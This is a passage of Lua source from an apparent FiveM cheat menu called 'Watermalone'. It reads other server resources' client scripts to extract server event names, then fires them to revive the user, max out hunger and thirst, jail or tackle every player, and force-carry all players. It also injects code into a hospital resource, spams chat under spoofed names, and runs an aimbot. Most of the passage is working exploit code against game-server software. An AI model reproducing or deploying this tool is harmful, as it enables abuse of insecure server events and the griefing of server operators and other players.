                end
            end
    
            if not wmlua.V.callbackTrigger and wmlua.V.Searched then
                wmlua.F.EventLogInsert("[~r~WM~w~] Failed (B)", 3000)
            elseif not wmlua.V.Searched then
                wmlua.F.EventLogInsert("[~r~WM~w~] Failed (A)")
            end
        end

    end

    function wmlua.F.ESXRead() -- Work In Progress

        if wmlua.ESX then

            wmlua_Thread(function()

                ptg = wmlua.F.GetInput("Enter Player Server Id")

                wmlua.ESX.TriggerServerCallback('esx:getOtherPlayerData', function(memes)

                    if memes then

                        for k,v in pairs(memes) do

                            if k == 'accounts' then

                                for k, v in pairs(v) do
                                    wmlua.F.DumpTable(v)
                                end

                            end

                        end

                    end

                end, ptg)

            end)

        end

    end

    function wmlua.F.ESXRevive()

        wmlua.V.ReviveSuccess = false
        wmlua.V.Searched = false
        wmlua.T.AmbulanceResources = {
            {res="esx_ambulancejob",file="client/job.lua",sigs={"specialContact.name","-- Load unloaded I".."P".."L".."s"},accept={'AddEventHandler'}},
            {res="esx_ambulancejob",file="client/main.lua",sigs={"specialContact.name","-- Load unloaded I".."P".."L".."s"},accept={'AddEventHandler'}},
            {res="Stz_ambulance",file="client/main.lua",sigs={"specialContact.name","-- Load unloaded I".."P".."L".."s"},accept={'AddEventHandler'}},
            {res="srp_ambulancejob",file="client/job.lua",sigs={"specialContact.name","-- Load unloaded I".."P".."L".."s"},accept={'AddEventHandler'}},
            {res="srp_ambulancejob",file="client/main.lua",sigs={"specialContact.name","-- Load unloaded I".."P".."L".."s"},accept={'AddEventHandler'}},
        }

        for i = 1, #wmlua.T.AmbulanceResources do
            wmlua.R.ESXAmbulanceMain = wmlua.N.LoadResourceFile(wmlua.T.AmbulanceResources[i].res, wmlua.T.AmbulanceResources[i].file)
            if wmlua.R.ESXAmbulanceMain then
                wmlua.V.Searched = true
                wmlua.V.ESXReviveEvent = wmlua.F.RetrieveTrigger(wmlua.R.ESXAmbulanceMain, wmlua.T.AmbulanceResources[i].sigs, wmlua.T.AmbulanceResources[i].accept)
                if wmlua.V.ESXReviveEvent then
                    wmlua.V.ReviveSuccess = true
                    wmlua_SendEvent(0, wmlua.V.ESXReviveEvent)
                    wmlua.F.EventLogInsert("[~b~WM~w~] Event: " .. wmlua.V.ESXReviveEvent)
                end
            end
        end

        if not wmlua.V.ReviveSuccess and wmlua.V.Searched then
            wmlua.F.EventLogInsert("[~r~WM~w~] Failed (B)", 3000)
        elseif not wmlua.V.ReviveSuccess then
            wmlua.F.EventLogInsert("[~r~WM~w~] Failed (A)")
        end

    end

    function wmlua.F.ESXHealLimbs()

        local code = [[
        
            local preventMolest = '.i = "Watermalone"'
            
            isBleeding = 0
            for k, v in pairs(BodyParts) do
                v.isDamaged = false
                v.severity = 0
            end
            injured = {}
            
            if ProcessRunStuff then ProcessRunStuff(]] .. wmlua.N.GetPlayerPed() .. [[) end
            if DoLimbAlert then DoLimbAlert() end
            if DoBleedAlert then DoBleedAlert() end
        
        ]]

        if wmlua.B.wmExecAt then
            wmlua.B.wmExecAt('mythic_hospital', code)
            wmlua.F.EventLogInsert("[~b~WM~w~] Limbs & Bleeding should be fixed")
        else
            wmlua.F.EventLogInsert("[~r~WM~w~] Failed to fix limbs & bleeding")
        end

    end

    function wmlua.F.ESXNoHunger()

        wmlua.V.TriggerSearch = 0
        wmlua.V.TriggerSearch_Act = 0
        wmlua.R.ESXStatusMain = wmlua.N.LoadResourceFile("esx_status", "client/main.lua")

        if wmlua.R.ESXStatusMain then

            wmlua.R.ESXStatusMainT = wmlua.F.Split(wmlua.R.ESXStatusMain, "\n")

            for k,v in ipairs(wmlua.R.ESXStatusMainT) do
                if string.match(v, "RegisterNetEvent") then
                    wmlua.V.TriggerSearch = wmlua.V.TriggerSearch + 1
                end

                if wmlua.V.TriggerSearch == 2 and wmlua.V.TriggerSearch_Act == 0 then
                    wmlua.V._ = wmlua.F.CleanString(v, "event")
                    wmlua.V.ESX_neverhungry_event = wmlua.V._
                    wmlua.V.TriggerSearch_Act = 1
                    wmlua_SendEvent(0, wmlua.V.ESX_neverhungry_event, 'hunger', 999999)
                    wmlua_SendEvent(0, wmlua.V.ESX_neverhungry_event, 'thirst', 999999)
                    wmlua.F.CFS("wmlua.V.ESX_neverhungry")
                end

            end

            if not wmlua.V.ESX_neverhungry_event then
                wmlua.F.EventLogInsert("[~r~WM~w~] Failed (B)")
            end

        else

            wmlua.F.EventLogInsert("[~r~WM~w~] Failed (A)")

        end

    end

    function wmlua.F.MISSuperMan()

        wmlua.F.SkyfallDo()

    end

    function wmlua.F.RCSpawn()

        wmlua.P.RCCar.Start()

    end

    function wmlua.F.RCHelify()

        local vehicle = wmlua.P.RCCar.Entity
        local npcs = wmlua.N.GetHashKey("mp_m_freemode_01")
        wmlua.F.RequestMdl(npcs)
        wmlua.F.RequestMdl(1044954915)
        local heli = wmlua.H.WMInvokeNative(0xAF35D0D2583051B0, 1044954915, 0.0, 0.0, 0.0, 0, true, true, true)
        local ai = wmlua.N.CreatePedInsideVehicle(heli, 4, npcs, -1, true, true)
        wmlua.F.RequestControl(ai)
        wmlua.F.RequestControl(vehicle)
        wmlua.F.RequestControl(heli)
        wmlua.N.SetDriverAbility(ai, 100)
        wmlua.N.SetHeliBladesFullSpeed(heli)
        wmlua.N.SetEntityProofs(vehicle, true, true, true, true, true, true, true, true)
        wmlua.N.SetVehicleColours(heli, 120, 120)
        wmlua.N.SetVehicleEngineOn(heli, true, true, false)
        wmlua.N.AttachEntityToEntity(heli, vehicle, 0.0, 0.0, 3.0, -4.2, 0.0, 0.0, 0.0, true, true, true, false, 2, true )
        wmlua.N.SetEntityAsMissionEntity(heli, true, true)

    end

    function wmlua.F.RCPreferFreecam()

        wmlua.F.CFS("wmlua.V.RC_preferfreecam")

    end

    function wmlua.F.RCGodmode()

        wmlua.F.CFS("wmlua.V.RC_godmode")

    end

    function wmlua.F.RCFix()

        wmlua.V._veh = wmlua.P.RCCar.Entity
        wmlua.F.RequestControl(wmlua.V._veh)
        wmlua.N.SetVehicleEngineHealth(wmlua.V._veh, 1000.0)
        wmlua.N.SetVehicleFixed(wmlua.V._veh)
        wmlua.N.SetVehicleDeformationFixed(wmlua.V._veh)
        wmlua.N.SetVehicleUndriveable(wmlua.V._veh, false)

    end

    function wmlua.F.RCUnflip()

        wmlua.F.RequestControl(wmlua.P.RCCar.Entity)
        wmlua.H.WMInvokeNative(0x8524A8B0171D5E07, wmlua.P.RCCar.Entity, 0.0, 0.0, 0.0, 2, true)
        wmlua.N.SetVehicleOnGroundProperly(wmlua.P.RCCar.Entity)

    end

    function wmlua.F.RCSpeedBoost()

        wmlua.F.CFS("wmlua.V.RC_boostpriority")

    end

    function wmlua.F.RCDelete()

        wmlua.P.RCCar.Attach("pick")

    end

    function wmlua.F.CHATToggle()

        wmlua.F.CFS("wmlua.V.CHAT_toggle")

    end

    function wmlua.F.CHATChangeRate()

        wmlua.V.CHATRate = wmlua.F.GetInput("Enter Spam Rate in Miliseconds")
        wmlua.V.CHATRate = tonumber(wmlua.V.CHATRate)

        if type(wmlua.V.CHATRate) == "number" then

            wmlua.F.CFT("wmlua.V.CHAT_changerate", "Spam Rate MS " .. wmlua.V.CHATRate)
            wmlua.V.CHAT_spamrate = wmlua.V.CHATRate

        end

    end

    function wmlua.F.CHATChangeMsg()

        wmlua.V.CHATType = wmlua.F.GetInput("Enter Type of msg (default or custom)")

        if wmlua.V.CHATType == "default" then
            wmlua.V.CHAT_msgtype = "default"
            wmlua.F.CFT("wmlua.V.CHAT_changemsg", "Chat Message Default")
        elseif wmlua.V.CHATType == "custom" then
            wmlua.V.CHAT_msgtype = "custom"
            wmlua.F.CFT("wmlua.V.CHAT_changemsg", "Chat Message Custom")
            wmlua.V.CHAT_custommsg = wmlua.F.GetInput("Enter Message")
        end

    end

    function wmlua.F.CHATChangeName()

        wmlua.V.CHATName = wmlua.F.GetInput("Enter Type of name (random or blank or spoofed)")

        if wmlua.V.CHATName == "random" then
            wmlua.V.CHAT_nametype = "random"
            wmlua.F.CFT("wmlua.V.CHAT_changename", "Name Random")
        elseif wmlua.V.CHATName == "blank" then
            wmlua.V.CHAT_nametype = "blank"
            wmlua.F.CFT("wmlua.V.CHAT_changename", "Name Blank")
            wmlua.V.CHAT_name = ""
        elseif wmlua.V.CHATName == "spoofed" then
            wmlua.V.CHAT_nametype = "spoofed"
            wmlua.F.CFT("wmlua.V.CHAT_changename", "Name Spoofed")
            wmlua.V.CHAT_name = wmlua.F.GetInput("Enter Name")
        end

    end

    function wmlua.F.CAMToggle()

        wmlua.F.CFS("wmlua.V.CAM_toggle")

        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.CAM_toggle"]].active then
            wmlua.F.EventLogInsert("[~b~WM~w~] Freecam enabled", 2000)
            wmlua.F.startCam()
        else
            wmlua.F.DeleteCam()
            wmlua.F.EventLogInsert("[~b~WM~w~] Freecam disabled", 2000)
            wmlua.N.SetFocusEntity(wmlua.N.GetPlayerPed())
        end

    end

    function wmlua.F.CAMModifyVehicleSpamList()

        wmlua.V.method = wmlua.F.GetInput("Method (set or add)")
        wmlua.V.NewSpamList = wmlua.F.GetInput("Enter Vehicle List (seperated by ,)")
        wmlua.V.NewSpamList = wmlua.V.NewSpamList:gsub("%s*", "")
        wmlua.V.NewSpamList = wmlua.F.Split(wmlua.V.NewSpamList, ',')
        wmlua.V.NewSpamList2 = {}
        for i = 1, #wmlua.V.NewSpamList do
            wmlua.F.InsertToTable(wmlua.V.NewSpamList2, wmlua.N.GetHashKey(wmlua.V.NewSpamList[i]))
        end
        if string.lower(wmlua.V.method) == "set" then
            wmlua.ST.SpamCars = wmlua.V.NewSpamList2
            wmlua.F.EventLogInsert('[~b~WM~w~] List set')
        elseif string.lower(wmlua.V.method) == "add" then
            for k,v in ipairs(wmlua.V.NewSpamList2) do
                wmlua.F.InsertToTable(wmlua.ST.SpamCars, v)
            end
            wmlua.F.EventLogInsert('[~b~WM~w~] Added to list')
        end

    end

    function wmlua.F.CAMModifyPedSpamList()

        wmlua.V.method = wmlua.F.GetInput("Method (set or add)")
        wmlua.V.NewSpamList = wmlua.F.GetInput("Enter Ped List (seperated by ,)")
        wmlua.V.NewSpamList = wmlua.V.NewSpamList:gsub("%s*", "")
        wmlua.V.NewSpamList = wmlua.F.Split(wmlua.V.NewSpamList, ',')
        wmlua.V.NewSpamList2 = {}
        for i = 1, #wmlua.V.NewSpamList do
            wmlua.F.InsertToTable(wmlua.V.NewSpamList2, wmlua.N.GetHashKey(wmlua.V.NewSpamList[i]))
        end
        if string.lower(wmlua.V.method) == "set" then
            wmlua.ST.SpamPeds = wmlua.V.NewSpamList2
            wmlua.F.EventLogInsert('[~b~WM~w~] List set')
        elseif string.lower(wmlua.V.method) == "add" then
            for k,v in ipairs(wmlua.V.NewSpamList2) do
                wmlua.F.InsertToTable(wmlua.ST.SpamPeds, v)
            end
            wmlua.F.EventLogInsert('[~b~WM~w~] Added to list')
        end

    end

    function wmlua.F.CAMModifyObjectSpamList()

        wmlua.V.method = wmlua.F.GetInput("Method (set or add)")
        wmlua.V.NewSpamList = wmlua.F.GetInput("Enter Object List (seperated by ,)")
        wmlua.V.NewSpamList = wmlua.V.NewSpamList:gsub("%s*", "")
        wmlua.V.NewSpamList = wmlua.F.Split(wmlua.V.NewSpamList, ',')
        wmlua.V.NewSpamList2 = {}
        for i = 1, #wmlua.V.NewSpamList do
            wmlua.F.InsertToTable(wmlua.V.NewSpamList2, wmlua.N.GetHashKey(wmlua.V.NewSpamList[i]))
        end
        if string.lower(wmlua.V.method) == "set" then
            wmlua.ST.SpamObjs = wmlua.V.NewSpamList2
            wmlua.F.EventLogInsert('[~b~WM~w~] List set')
        elseif string.lower(wmlua.V.method) == "add" then
            for k,v in ipairs(wmlua.V.NewSpamList2) do
                wmlua.F.InsertToTable(wmlua.ST.SpamObjs, v)
            end
            wmlua.F.EventLogInsert('[~b~WM~w~] Added to list')
        end

    end

    function wmlua.F.CAMModifySFXSpamList()

        wmlua.V.method = wmlua.F.GetInput("Method (add or clear)")
        
        if string.find(string.lower(wmlua.V.method), "add", 1, true) then
            wmlua.V.NewPartDict = wmlua.F.GetInput("Enter Particle Dict")
            wmlua.V.NewPartEffect = wmlua.F.GetInput("Enter Particle Effect")
            wmlua.V.NewPartSize = wmlua.F.GetInput("Enter Particle Size")
            if type(tonumber(wmlua.V.NewPartSize)) == "number" then
                wmlua.F.InsertToTable(wmlua.ST.SpamSfx, {c1 = wmlua.V.NewPartDict, c2 = wmlua.V.NewPartEffect, size = tonumber(wmlua.V.NewPartSize) + .0})
                wmlua.F.EventLogInsert('[~b~WM~w~] Added to list')
            else
                wmlua.F.EventLogInsert('[~r~WM~w~] Invalid Input')
            end
        elseif string.find(string.lower(wmlua.V.method), "clear", 1, true) then
            wmlua.ST.SpamSfx = {}
            wmlua.F.EventLogInsert("[~b~WM~w~] Cleared SFX List")
        else
            wmlua.F.EventLogInsert("[~r~WM~w~] Invalid Input")
        end

    end

    function wmlua.F.CAMResetLists()

        wmlua.ST.SpamCars = wmlua.T.SpamCarsOriginal
        wmlua.ST.SpamPeds = wmlua.T.SpamPedsOriginal
        wmlua.ST.SpamObjs = wmlua.T.SpamObjsOriginal
        wmlua.ST.SpamSfx = wmlua.T.SpamSfxOriginal

        wmlua.F.EventLogInsert("[~b~WM~w~] Reset spam lists to defaults")

    end

    function wmlua.F.TRIGCommunityService()

        wmlua.V._ = nil
        wmlua.R.ESXPoliceJob_CS = wmlua.N.LoadResourceFile("esx_policejob", "client/main.lua") or wmlua.N.LoadResourceFile("tac_policejob", "client/main.lua") or wmlua.N.LoadResourceFile("police", "client/main.lua") or wmlua.N.LoadResourceFile("hell_policejob", "client/main.lua")

        if wmlua.R.ESXPoliceJob_CS then

            wmlua.R.ESXPoliceJob_CS_T = wmlua.F.Split(wmlua.R.ESXPoliceJob_CS, "\n")
            
            wmlua.R.AcceptTrigger = false
            for k,v in ipairs(wmlua.R.ESXPoliceJob_CS_T) do
                if string.find(v, "if community_services_count == nil then", 1, true) then
                    wmlua.R.AcceptTrigger = true
                end

                if wmlua.R.AcceptTrigger == true and string.find(v, "TriggerServerEvent", 1, true) then
                    wmlua.R.AcceptTrigger = false
                    wmlua.F.EventLogInsert('[~b~WM~w~] ' .. wmlua.V._ .. " " .. wmlua.N.GetPlayerServerId(player))
                    wmlua_Thread(function()
                        for _,player in ipairs(wmlua.N.GetActivePlayers()) do
                            wmlua_SendEvent(1, wmlua.V._, wmlua.N.GetPlayerServerId(player), 666)
                            wmlua_Schleep(20)
                        end
                    end)
                end

            end

            if not wmlua.V._ then

                wmlua.F.EventLogInsert("[~r~WM~w~] Failed (B)")

            end

        else

            wmlua.F.EventLogInsert("[~r~WM~w~] Failed (A)")

        end

    end

    function wmlua.F.TRIGJailAll()

        wmlua.V._ = nil
        wmlua.R.ESXJailAll_CS = wmlua.N.LoadResourceFile("esx_jailer", "client/main.lua") or wmlua.N.LoadResourceFile("esx_qalle_jail", "client/client.lua") or wmlua.N.LoadResourceFile("esx-qalle-jail", "client/client.lua") or wmlua.N.LoadResourceFile("esx_policejob", "client/main.lua") or wmlua.N.LoadResourceFile("tac_policejob", "client/main.lua") or wmlua.N.LoadResourceFile("police", "client/main.lua") or wmlua.N.LoadResourceFile("hell_policejob", "client/main.lua")

        if wmlua.R.ESXJailAll_CS then

            wmlua.R.ESXJailAll_CS_T = wmlua.F.Split(wmlua.R.ESXJailAll_CS, "\n")
            
            wmlua.R.AcceptTrigger = false
            for k,v in ipairs(wmlua.R.ESXJailAll_CS_T) do
                if string.find(v, 'SetRelationshipBetweenGroups(1, GetHashKey("PRISONER")', 1, true) or string.find(v, 'title = "Jail Reason"', 1, true) or string.find(v, 'local jailTime = tonumber(data2.value)', 1, true) then
                    wmlua.R.AcceptTrigger = true
                end

                if wmlua.R.AcceptTrigger and string.find(v, "TriggerServerEvent", 1, true) then
                    wmlua.R.AcceptTrigger = false
                    wmlua.V._ = wmlua.F.CleanString(v, "event")
                    wmlua_Thread(function()
                        for _,player in ipairs(wmlua.N.GetActivePlayers()) do
                            wmlua_SendEvent(1, wmlua.V._, wmlua.N.GetPlayerServerId(player), 666, "Watermalone.net on top, best recognize.")
                            wmlua_Schleep(25)
                        end
                    end)
                end

            end

            if not wmlua.V._ then

                wmlua.F.EventLogInsert("[~r~WM~w~] Failed (B)")

            end

        else

            wmlua.F.EventLogInsert("[~r~WM~w~] Failed (A)")

        end

    end

    function wmlua.F.TRIGCarryAll()

        wmlua.V._ = nil
        wmlua.V.ShouldBoonk = wmlua.F.GetInput("Eject Others (y/n)")
        wmlua.R.CarryPeople_CS = wmlua.N.LoadResourceFile("lls_mug", "client.lua") or wmlua.N.LoadResourceFile("CarryPeople", "cl_carry.lua") or wmlua.N.LoadResourceFile("BANDITRPBasics", "client/takehostagecl.lua")
    
        if wmlua.R.CarryPeople_CS then
    
            wmlua.R.CarryPeople_CS_T = wmlua.F.Split(wmlua.R.CarryPeople_CS, "\n")
            
            wmlua.R.AcceptTrigger = false
            wmlua.V.X, wmlua.V.Y, wmlua.V.Z = table.unpack(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()))
            wmlua.V.KEK = wmlua.N.SpawnVeh(wmlua.N.GetHashKey("bmx"), wmlua.V.X, wmlua.V.Y, wmlua.V.Z, 0.0, 0, 0)
            for k,v in ipairs(wmlua.R.CarryPeople_CS_T) do
                if string.find(v, "carryingBackInProgress = true", 1, true) or string.find(v, "piggyBackInProgress = true", 1, true) then
                    wmlua.R.AcceptTrigger = true
                end
    
                if wmlua.R.AcceptTrigger == true and string.find(v, "TriggerServerEvent", 1, true) then
                    wmlua.R.AcceptTrigger = false
                    wmlua.V._ = wmlua.F.CleanString(v, "event")
                    wmlua.N.SetEntVisible(wmlua.V.KEK, false)
                    wmlua_Thread(function()
                        for _,player in ipairs(wmlua.N.GetActivePlayers()) do
                            if string.lower(wmlua.V.ShouldBoonk) == "y" then
                                wmlua.N.Clear_PedTasks(wmlua.N.GetPlayerPed(player), true)
                            end
                            wmlua.F.EventLogInsert(wmlua.V._)
                            wmlua_SendEvent(1, wmlua.V._, wmlua.N.GetPlayerPed(player), 'missfinale_c2mcs_1','nm','fin_c2_mcs_1_camman','firemans_carry', 555550.15, 5.27, 0.63, -1, 100000, 0.0, 50, 33, 1)
                        end
                        for i = 1, 100 do
                            wmlua.N.TaskWarpPedIntoVehicle(wmlua.N.GetPlayerPed(), wmlua.V.KEK, -1)
                        end
                    end)
                end
    
            end
    
            if not wmlua.V._ then
    
                wmlua.F.EventLogInsert("[~r~WM~w~] Failed (B)")
    
            end
    
        else
    
            wmlua.F.EventLogInsert("[~r~WM~w~] Failed (A)")
    
        end
    
    end

    function wmlua.F.TRIGTackleAll()

        wmlua.V._ = nil
        wmlua.V.ShouldBoonk = wmlua.F.GetInput("Eject Others (y/n)")
        wmlua.R.TackleRes_CS = wmlua.N.LoadResourceFile("esx_ktackle", "client/main.lua") or wmlua.N.LoadResourceFile("BANDITRPBasics", "client/ktacklecl.lua")
    
        if wmlua.R.TackleRes_CS then
    
            wmlua.R.TackleRes_CS_T = wmlua.F.Split(wmlua.R.TackleRes_CS, "\n")
            
            wmlua.R.AcceptTrigger = false
            for k,v in ipairs(wmlua.R.TackleRes_CS_T) do
                if string.find(v, "lastTackleTime = GetGameTimer()", 1, true) then
                    wmlua.R.AcceptTrigger = true
                end
    
                if wmlua.R.AcceptTrigger == true and string.find(v, "TriggerServerEvent", 1, true) then
                    wmlua.R.AcceptTrigger = false
                    wmlua.V._ = wmlua.F.CleanString(v, "event")
                    wmlua.V.X, wmlua.V.Y, wmlua.V.Z = table.unpack(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()))
                    wmlua.V.KEK = wmlua.N.SpawnVeh(wmlua.N.GetHashKey("bmx"), wmlua.V.X, wmlua.V.Y, wmlua.V.Z, 0.0, 0, 0)
                    wmlua.N.SetEntVisible(wmlua.V.KEK, false)
                    wmlua.N.TaskWarpPedIntoVehicle(wmlua.N.GetPlayerPed(), wmlua.V.KEK, -1)
                    wmlua_Schleep(500)
                    wmlua_Thread(function()
                        for _,player in ipairs(wmlua.N.GetActivePlayers()) do
                            wmlua.N.TaskWarpPedIntoVehicle(wmlua.N.GetPlayerPed(), wmlua.V.KEK, -1)
                            if string.lower(wmlua.V.ShouldBoonk) == "y" then
                                wmlua.N.Clear_PedTasks(wmlua.N.GetPlayerPed(player), true)
                            end
                            wmlua_SendEvent(1, wmlua.V._, wmlua.N.GetPlayerServerId(player), 666)
                            wmlua_Schleep(50)
                        end
                    end)
                end
    
            end
    
            if not wmlua.V._ then
    
                wmlua.F.EventLogInsert("[~r~WM~w~] Failed (B)")
    
            end
    
        else
    
            wmlua.F.EventLogInsert("[~r~WM~w~] Failed (A)")
    
        end
    
    end

    wmlua.F.BuildCheese()

    wmlua_Thread(function()

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                if wmlua.V.Sprite then
                    wmlua.N.RequestStreamedTextureDict(wmlua.V.TextDict, false)
                    wmlua.N.DrawSprite(wmlua.V.TextDict, wmlua.V.Sprite, 0.5, 0.5, 0.931, 0.935, 0.0, 255,255,255,255)
                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    -- Threads

    wmlua_Thread(function()

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(wmlua.V.CHAT_spamrate)

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.CHAT_toggle"]].active then

                    if wmlua.V.CHAT_msgtype == wmlua.STRINGS[92] then
                        wmlua.V.CHAT_spammsg = wmlua.STRINGS[93]
                    else
                        wmlua.V.CHAT_spammsg = wmlua.V.CHAT_custommsg
                    end

                    wmlua_SendEvent(1, wmlua.STRINGS[94], wmlua.V.CHAT_name, { 255, 255, 255 }, wmlua.V.CHAT_spammsg)

                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua.V.prevframes = wmlua.N.Get_FrameCount()
    wmlua.V.prevtime = wmlua.N.Get_GameTimer()
    wmlua.V.curtime = 0
    wmlua.V.curframes = 0
    wmlua.V.fps = 0

    wmlua_Thread(function() -- ye ye, not the most accurate thing but, needed for FPS Compensation

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                wmlua.V.curtime = wmlua.N.Get_GameTimer()
                wmlua.V.curframes = wmlua.N.Get_FrameCount()

                if (wmlua.V.curtime - wmlua.V.prevtime) > 500 then
                    wmlua.V.fps = (wmlua.V.curframes - wmlua.V.prevframes) - 1
                    wmlua.V.fps = wmlua.V.fps * 2
                    wmlua.V.prevtime = wmlua.V.curtime
                    wmlua.V.prevframes = wmlua.V.curframes
                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end
    end)

    wmlua.V.NoclipSpeed = 0.1

    wmlua_Thread(function() -- HP LOOP

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                if #wmlua.T.FrozenNerds > 0 then
                    for i = 1, #wmlua.T.FrozenNerds do
                        wmlua.N.Clear_PedTasks(wmlua.T.FrozenNerds[i], true)
                    end
                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua.T.rpK = {
        {_or = wmlua.STRINGS[69], _rep = wmlua.STRINGS[19]},
        {_or = wmlua.STRINGS[70], _rep = "S"},
        {_or = wmlua.STRINGS[71], _rep = "S"},
        {_or = wmlua.STRINGS[72], _rep = "D"},
        {_or = "DA", _rep = "D"}, -- yeah im aware this aids solution for S,D but it works and idk the proper method / a better way tbh.
        {_or = "b_100", _rep = "LMB"}, -- Combination of Spacebar / ENTER / LMB but primarily LMB
        {_or = "b_101", _rep = "RMB"}, -- This is a guess, dont care to double check.
        {_or = "b_113", _rep = wmlua.STRINGS[19]}, -- dont remember what this one is, dont care. but decided to yeet it /tsk
        {_or = "b_115", _rep = wmlua.STRINGS[32]},
        {_or = "b_116", _rep = wmlua.STRINGS[31]},
        {_or = "b_117", _rep = wmlua.STRINGS[31]},
        {_or = "b_170", _rep = "F1"},
        {_or = "b_171", _rep = "F2"},
        {_or = "b_172", _rep = "F3"},
        {_or = "b_174", _rep = "F5"},
        {_or = "b_175", _rep = "F6"},
        {_or = "b_176", _rep = "F7"},
        {_or = "b_177", _rep = "F8"},
        {_or = "b_178", _rep = "F9"},
        {_or = "b_179", _rep = "F10"},
        {_or = "b_180", _rep = "F11"},
        {_or = "b_1000", _rep = "LSHIFT"},
        {_or = "b_1002", _rep = "TAB"},
        {_or = "b_1003", _rep = "ENTER"},
        {_or = "b_1012", _rep = "CAPSLOCK"},
        {_or = "b_1013", _rep = "LCTRL"},
        {_or = "b_1014", _rep = "RCTRL"},
        {_or = "b_2000", _rep = "SPACEBAR"},
        {_or = "b_194", _rep = "MMB"},
    }

    function wmlua.F.FormatControlName(_cn)

        for k,v in ipairs (wmlua.T.rpK) do
            _cn = string.gsub(_cn, v._or, v._rep)
        end

        return _cn

    end

    wmlua_Thread(function() -- Aimbot Thread

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Aim_tog"]].active then
                    wmlua_Thread(function() wmlua.F.aimwmbot() end)
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Aim_drawfov"]].active then
                    wmlua_Thread(function() wmlua.F.aim_drawFOV() end)
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Aim_drawcrosshair"]].active and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active and not wmlua.menu.v.drawmenu then

                    wmlua.V.AimingAtEnt = wmlua.N.GetEntityPlayerIsFreeAimingAt(wmlua.N.PlayerId())

                    if wmlua.N.IsEntityAPed(wmlua.V.AimingAtEnt) and wmlua.N.IsEntityDead(wmlua.V.AimingAtEnt) == false then
                        wmlua.V.xhaircolor = {red = 255, green = 0, blue = 0, alpha = 255}
                    else
                        wmlua.V.xhaircolor = {red = 255, green = 255, blue = 255, alpha = 255}
                    end

                    wmlua.V.xhaircolor_bg = {red = 0, green = 0, blue = 0, alpha = 255}

                    wmlua.menu.f.drawrect_pure({x = 0.4945, y = 0.5, w = 0.0048, h = 0.003}, wmlua.V.xhaircolor_bg) -- left [outline]
                    wmlua.menu.f.drawrect_pure({x = 0.4945, y = 0.5, w = 0.004, h = 0.002}, wmlua.V.xhaircolor) -- left [inner]

                    wmlua.menu.f.drawrect_pure({x = 0.5055, y = 0.5, w = 0.0048, h = 0.003}, wmlua.V.xhaircolor_bg) -- right [outline]
                    wmlua.menu.f.drawrect_pure({x = 0.5055, y = 0.5, w = 0.004, h = 0.002}, wmlua.V.xhaircolor) -- right [inner]

                    wmlua.menu.f.drawrect_pure({x = 0.5002, y = 0.490, w = 0.0021, h = 0.005 + 0.0032}, wmlua.V.xhaircolor_bg) -- top [outline]
                    wmlua.menu.f.drawrect_pure({x = 0.5002, y = 0.490, w = 0.001, h = 0.004 + 0.0025}, wmlua.V.xhaircolor) -- top [inner]

                    wmlua.menu.f.drawrect_pure({x = 0.5002, y = 0.510, w = 0.0021, h = 0.005 + 0.0032}, wmlua.V.xhaircolor_bg) -- bottom [outline]
                    wmlua.menu.f.drawrect_pure({x = 0.5002, y = 0.510, w = 0.001, h = 0.004 + 0.0025}, wmlua.V.xhaircolor) -- bottom [inner]

                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua_Thread(function() -- Vehicle Thread

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Veh_animatedplate"]].active then

                    local plates = {"watermal",'atermalo','termalon','ermalone', 'rmalone ', 'malone w', 'alone wa', 'lone wat', 'one wate', 'ne water', 'e waterm', ' waterma'}
                    for i = 1, #plates do
                        wmlua.N.SetVehicleNumberPlateText(wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed()), plates[i])
                        wmlua_Schleep(500)
                    end

                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua_Thread(function() -- Vehicle Thread

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                if wmlua.V.powerval ~= 1 then
                    wmlua.H.WMInvokeNative(wmlua.STRINGS[61], wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()), wmlua.V.powerval)
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Veh_alwayswheelie"]].active and wmlua.N.IsPedInAVehicle(wmlua.N.GetPlayerPed()) and GetVehicleCurrentGear(wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed())) > 0 then
                    SetVehicleWheelieState(wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), false), 129)
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Veh_enginealwayson"]].active then

                    wmlua.N.SetVehicleEngineOn(wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()), true, true, false)

                end

